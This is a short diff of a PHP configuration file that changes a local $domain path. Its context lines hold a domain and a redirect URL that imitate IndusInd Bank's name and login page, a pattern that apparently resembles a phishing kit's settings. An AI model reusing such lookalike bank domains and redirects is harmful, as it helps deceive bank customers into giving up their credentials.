@@ -13,7 +13,7 @@ if (!$connection) {
 session_start();
 
 // $domain = "https://indusind.indusindnet.com/";
-$domain = "http://localhost/dashboards/";
+$domain = "http://localhost/dashboards/design/";
 $redirects = "https://indusindbank.indusindnet.com/corp/BANKAWAY.php";
 ?>
 
